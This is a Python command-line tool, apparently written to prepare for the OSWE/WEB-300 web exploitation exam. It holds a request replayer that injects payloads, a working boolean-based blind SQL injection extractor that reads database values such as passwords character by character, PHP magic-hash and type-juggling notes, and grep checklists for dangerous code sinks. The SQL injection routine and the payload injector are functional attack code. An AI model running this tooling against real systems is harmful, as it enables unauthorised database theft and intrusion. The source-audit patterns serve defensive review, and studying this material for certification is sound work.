#!/usr/bin/env python3
"""web300.py — OSWE/WEB-300 automation CLI.

  python3 web300.py replay capture.req                  # replay raw request
  python3 web300.py replay capture.req --set session=.. --inject id=PAYLOADFILE
  python3 web300.py blindsqli capture.req --marker "Welcome" \
      --param id --sql "SELECT password FROM users WHERE id=1"   # boolean exfil
  python3 web300.py juggle 0e123                        # php magic-hash notes
  python3 web300.py audit /src --lang php               # vuln-class grep checklists
"""
import sys

def cmd_replay(reqfile, sets, inject):
    raw = open(reqfile, 'rb').read().decode('utf-8', 'replace')
    head, _, body = raw.partition('\r\n\r\n')
    if not body: head, _, body = raw.partition('\n\n')
    lines = head.replace('\r\n', '\n').split('\n')
    method, path, _ = lines[0].split(' ', 2)
    hdrs = dict(l.split(': ', 1) for l in lines[1:] if ': ' in l)
    for k, v in sets:
        hdrs[k] = v
    if inject:
        param, payloadfile = inject.split('=', 1)
        import urllib.parse, re
        payload = open(payloadfile).read()
        body = re.sub(r'(' + re.escape(param) + r'=)[^&\s]*',
                      lambda m: m.group(1) + urllib.parse.quote(payload, safe=''), body)
    import http.client
    host = hdrs.get('Host', 'localhost')
    conn = http.client.HTTPConnection(host)
    hdrs.pop('Content-Length', None)
    hdrs.pop('Accept-Encoding', None)
    conn.request(method, path, body=body, headers=hdrs)
    r = conn.getresponse()
    data = r.read()
    print(f"[+] {r.status} ({len(data)} bytes)")
    print(data.decode('utf-8', 'replace')[:2000])

def cmd_blindsqli(reqfile, marker, param, sql):
    """Boolean-based binary-search exfil. --marker = string present when TRUE."""
    import http.client, urllib.parse, re
    raw = open(reqfile).read()
    head, _, body = raw.partition('\r\n\r\n')
    lines = head.split('\r\n')
    method, path, _ = lines[0].split(' ', 2)
    hdrs = dict(l.split(': ', 1) for l in lines[1:] if ': ' in l)
    host = hdrs.get('Host', 'localhost')

    def ask(payload):
        b = re.sub(r'(' + re.escape(param) + r'=)[^&\s]*',
                   lambda m: m.group(1) + urllib.parse.quote(payload, safe=''), body)
        h = dict(hdrs); h.pop('Content-Length', None); h.pop('Accept-Encoding', None)
        c = http.client.HTTPConnection(host)
        c.request(method, path, body=b, headers=h)
        d = c.getresponse().read().decode('utf-8', 'replace')
        return marker in d

    def true(expr):
        return ask(f"1' AND IF(({expr}),1,0)-- -")

    out = ''
    for pos in range(1, 65):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if true(f"ASCII(SUBSTRING(({sql}),{pos},1))>{mid}"): lo = mid + 1
            else: hi = mid
        if lo == 32: break
        out += chr(lo)
        print(f"\r[+] {pos}: {out}   ", end='', flush=True)
    print()

def cmd_juggle(needle=''):
    KNOWN = ["0e462097431906829019388988221", "0e830400451993494058024219903391",
             "0e545993274517709034328855841020", "0e1137126903a59cee581e0ea1b6d2bb"]
    print("[*] PHP loose-compare notes:")
    print("    '0e<digits>' == '0e<digits>'  -> TRUE (both parse as 0.0 float)")
    print("    md5($x)==0 via magic hashes; sha1 variants exist too")
    print("    type coercion: '1abc' == 1 TRUE (PHP<8); 0 == 'foo' TRUE (PHP<8) / FALSE (PHP>=8)")
    print("    NULL == '' / 0 / '0' pitfalls in strcmp(), in_array() without strict flag")
    print(f"[*] known md5 magic strings: {KNOWN[0]} etc.")

def cmd_audit(srcdir, lang):
    CHECKS = {
        'php': {
            'SQLi': ['mysql_query', 'mysqli_query', '->query(', '->exec('],
            'File upload': ['move_uploaded_file', '$_FILES', 'getimagesize'],
            'Deserialization': ['unserialize('],
            'Type juggling': ['==', 'strcmp(', 'in_array(', 'md5($'],
            'RCE': ['eval(', 'system(', 'exec(', 'shell_exec(', 'passthru(', 'preg_replace.*\\/e'],
            'LFI/RFI': ['include(', 'require(', 'file_get_contents('],
            'XXE': ['simplexml_load', 'DOMDocument', 'LIBXML_NOENT'],
        },
        'csharp': {
            'Deserialization': ['BinaryFormatter', 'SoapFormatter', 'LosFormatter',
                                'JavaScriptSerializer', 'TypeNameHandling'],
            'SQLi': ['SqlCommand', 'ExecuteReader', 'ExecuteScalar'],
            'ViewState': ['ViewState', 'MachineKey'],
            'RCE': ['Process.Start', 'Eval(', 'CodeDom'],
            'XXE': ['XmlDocument', 'XmlTextReader', 'DtdProcessing'],
        },
        'js': {
            'Proto pollution': ['__proto__', 'constructor.prototype', 'merge(', 'extend('],
            'RCE': ['eval(', 'Function(', 'child_process'],
            'SQLi': ['.query(', 'sequelize', 'knex.raw'],
        },
    }[lang]
    import subprocess
    ext = {'php': 'php', 'csharp': 'cs', 'js': 'js'}[lang]
    for vuln, pats in CHECKS.items():
        print(f"\n== {vuln} ==")
        for p in pats:
            r = subprocess.run(['grep', '-rnE', p, srcdir, '--include=*.' + ext],
                               capture_output=True, text=True)
            for line in r.stdout.splitlines()[:5]:
                print('   ', line[:140])

if __name__ == '__main__':
    a = sys.argv[1:]
    if not a: print(__doc__); sys.exit(0)
    def o(flag): return a[a.index(flag) + 1] if flag in a else None
    if a[0] == 'replay':
        sets = [kv.split('=', 1) for kv in (a[a.index('--set') + 1:] if '--set' in a else []) if '=' in kv and not kv.startswith('--')]
        cmd_replay(a[1], sets, o('--inject'))
    elif a[0] == 'blindsqli':
        cmd_blindsqli(a[1], o('--marker'), o('--param'), o('--sql'))
    elif a[0] == 'juggle':
        cmd_juggle(a[1] if len(a) > 1 else '')
    elif a[0] == 'audit':
        cmd_audit(a[1], o('--lang') or 'php')
    else:
        print(__doc__)
